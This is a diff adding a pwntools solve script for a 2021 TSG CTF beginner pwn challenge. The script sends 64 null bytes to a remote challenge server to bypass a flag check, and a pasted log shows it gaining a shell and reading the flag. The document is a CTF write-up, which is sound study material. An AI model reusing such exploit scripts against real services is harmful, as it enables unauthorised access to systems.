@@ -1,0 +1,42 @@
+from pwn import *
+
+context(os='linux', arch='amd64')
+#context.log_level = 'debug'
+
+BINARY = './chall'
+elf  = ELF(BINARY)
+
+if len(sys.argv) > 1 and sys.argv[1] == 'r':
+  HOST = "34.146.101.4"
+  PORT = 30007
+  s = remote(HOST, PORT)
+else:
+  s = process(BINARY)
+
+s.recvuntil("guess the flag!> \n")
+
+s.sendline("\x00"*64)
+
+s.interactive()
+
+'''
+mito@ubuntu:~/CTF/TSG_CTF_2021/Pwn_Beginner's_Pwn_2021/beginners_pwn$ python solve.py r
+[*] "/home/mito/CTF/TSG_CTF_2021/Pwn_Beginner's_Pwn_2021/beginners_pwn/chall"
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 34.146.101.4 on port 30007: Done
+[*] Switching to interactive mode
+yes
+$ id
+uid=999(user) gid=999(user) groups=999(user)
+$ ls -l
+total 28
+-r-xr-xr-x 1 root user 17288 Oct  2 04:02 chall
+-r--r--r-- 1 root user    46 Oct  2 04:02 flag
+-r-xr-xr-x 1 root user    66 Oct  2 04:02 start.sh
+$ cat flag
+TSGCTF{just_a_simple_off_by_one-chall_isnt_it}$
+'''
